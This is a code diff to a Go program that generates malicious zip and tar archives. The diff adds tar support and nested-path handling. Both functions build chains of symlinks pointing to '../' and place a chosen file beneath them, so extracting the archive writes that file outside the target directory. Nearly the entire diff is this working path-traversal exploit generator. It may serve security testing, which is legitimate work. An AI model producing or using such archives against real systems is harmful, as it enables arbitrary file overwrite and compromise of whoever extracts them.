@@ -1,11 +1,13 @@
 package main
 
 import (
+	"archive/tar"
 	"archive/zip"
 	"fmt"
 	"io"
 	"log/slog"
 	"os"
+	"path"
 	"path/filepath"
 	"strings"
 	"time"
@@ -62,7 +64,7 @@ func main() {
 		}
 
 	case "tar":
-		if err := createTar(logger); err != nil {
+		if err := createTar(); err != nil {
 			logger.Error("failed to create tar archive", "error", err)
 			os.Exit(1)
 		}
@@ -74,7 +76,6 @@ func main() {
 }
 
 func createZip() error {
-	// Create a zip archive
 
 	// create a new zip archive
 	zipfile, err := os.Create(CLI.Out)
@@ -107,7 +108,7 @@ func createZip() error {
 	}
 
 	// check how many traversals are needed
-	traversals := strings.Count(CLI.RelativePath, "../")
+	traversals := countPrefixes(CLI.RelativePath, "../")
 	basePath := "sub/root/outside"
 	for i := 0; i < traversals; i++ {
 		basePath = fmt.Sprintf("%s/%v", basePath, i)
@@ -116,8 +117,17 @@ func createZip() error {
 		}
 	}
 
-	// add the file to the zip archive
-	filePath := fmt.Sprintf("%s/%s", basePath, CLI.InputFile)
+	// prepare the path for the file
+	parts := strings.Split(CLI.RelativePath[(3*traversals):], "/")
+	for _, part := range parts[:len(parts)-1] {
+		basePath = path.Join(basePath, part)
+		if err := addFolderToZip(zipWriter, basePath); err != nil {
+			return fmt.Errorf("failed to add folder '%s' to zip: %s", basePath, err)
+		}
+	}
+
+	// add the file to the tar archive
+	filePath := fmt.Sprintf("%s/%s", basePath, parts[len(parts)-1])
 	if err := addFileToZip(zipWriter, CLI.InputFile, filePath); err != nil {
 		return fmt.Errorf("failed to add file to zip: %s", err)
 	}
@@ -210,6 +220,145 @@ func addSymlinkToZip(zipWriter *zip.Writer, symlinkName string, target string) e
 	return nil
 }
 
-func createTar(logger *slog.Logger) error {
-	panic("not implemented")
+func createTar() error {
+
+	// open the output file
+	tarfile, err := os.Create(CLI.Out)
+	if err != nil {
+		return fmt.Errorf("failed to create tar file: %s", err)
+	}
+	defer func() {
+		if err := tarfile.Close(); err != nil {
+			panic(fmt.Errorf("failed to close tar file: %s", err))
+		}
+	}()
+
+	// create a new tar writer
+	tarWriter := tar.NewWriter(tarfile)
+	defer func() {
+		if err := tarWriter.Close(); err != nil {
+			panic(fmt.Errorf("failed to close tar writer: %s", err))
+		}
+	}()
+
+	// create basic tar structure
+	if err := addFolderToTar(tarWriter, "sub/"); err != nil {
+		return fmt.Errorf("failed to add folder 'sub/' to tar: %s", err)
+	}
+	if err := addSymlinkToTar(tarWriter, "sub/root", "../"); err != nil {
+		return fmt.Errorf("failed to add symlink 'sub/root --> ../' to tar: %s", err)
+	}
+	if err := addSymlinkToTar(tarWriter, "sub/root/outside", "../"); err != nil {
+		return fmt.Errorf("failed to add symlink 'sub/root/outside --> ../' to tar: %s", err)
+	}
+
+	// check how many traversals are needed
+	traversals := countPrefixes(CLI.RelativePath, "../")
+	basePath := "sub/root/outside"
+	for i := 0; i < traversals; i++ {
+		basePath = fmt.Sprintf("%s/%v", basePath, i)
+		if err := addSymlinkToTar(tarWriter, basePath, "../"); err != nil {
+			return fmt.Errorf("failed to add symlink '%s --> ../' to tar: %s", basePath, err)
+		}
+	}
+
+	// prepare the path for the file
+	parts := strings.Split(CLI.RelativePath[(3*traversals):], "/")
+	for _, part := range parts[:len(parts)-1] {
+		basePath = path.Join(basePath, part)
+		if err := addFolderToTar(tarWriter, basePath); err != nil {
+			return fmt.Errorf("failed to add folder '%s' to tar: %s", basePath, err)
+		}
+	}
+
+	// add the file to the tar archive
+	filePath := fmt.Sprintf("%s/%s", basePath, parts[len(parts)-1])
+	if err := addFileToTar(tarWriter, CLI.InputFile, filePath); err != nil {
+		return fmt.Errorf("failed to add file to tar: %s", err)
+	}
+
+	return nil
+}
+
+func countPrefixes(s, prefix string) int {
+	count := 0
+	for strings.HasPrefix(s, prefix) {
+		count++
+		s = strings.TrimPrefix(s, prefix)
+	}
+	return count
+}
+
+func addFolderToTar(tarWriter *tar.Writer, folder string) error {
+
+	// ensure folder nomenclature
+	if !strings.HasSuffix(folder, "/") {
+		folder = folder + "/"
+	}
+	tarHeader := &tar.Header{
+		Name:     folder,
+		Mode:     0755,
+		ModTime:  time.Now(),
+		Typeflag: tar.TypeDir,
+	}
+
+	if err := tarWriter.WriteHeader(tarHeader); err != nil {
+		return fmt.Errorf("failed to write tar header for directory: %s", err)
+	}
+
+	return nil
+}
+
+func addFileToTar(tarWriter *tar.Writer, file string, relativePath string) error {
+
+	// open the file
+	fileReader, err := os.Open(file)
+	if err != nil {
+		return fmt.Errorf("failed to open file: %s", err)
+	}
+	defer fileReader.Close()
+
+	// stat input
+	fileInfo, err := fileReader.Stat()
+	if err != nil {
+		return fmt.Errorf("failed to stat file: %s", err)
+	}
+
+	// create a new file header
+	tarHeader, err := tar.FileInfoHeader(fileInfo, "")
+	if err != nil {
+		return fmt.Errorf("failed to create file header: %s", err)
+	}
+
+	// set the name of the file
+	tarHeader.Name = relativePath
+
+	// write the file to the tar archive
+	if err := tarWriter.WriteHeader(tarHeader); err != nil {
+		return fmt.Errorf("failed to write file to tar archive: %s", err)
+	}
+	if _, err := io.Copy(tarWriter, fileReader); err != nil {
+		return fmt.Errorf("failed to write file to tar archive: %s", err)
+	}
+
+	return nil
+}
+
+func addSymlinkToTar(tarWriter *tar.Writer, symlinkName string, target string) error {
+
+	// create a new file header
+	tarHeader := &tar.Header{
+		Name:     symlinkName,
+		Mode:     0755,
+		ModTime:  time.Now(),
+		Typeflag: tar.TypeSymlink,
+		Linkname: target,
+	}
+
+	// write the symlink to the tar archive
+	if err := tarWriter.WriteHeader(tarHeader); err != nil {
+		return fmt.Errorf("failed to write symlink to tar archive: %s", err)
+	}
+
+	return nil
 }
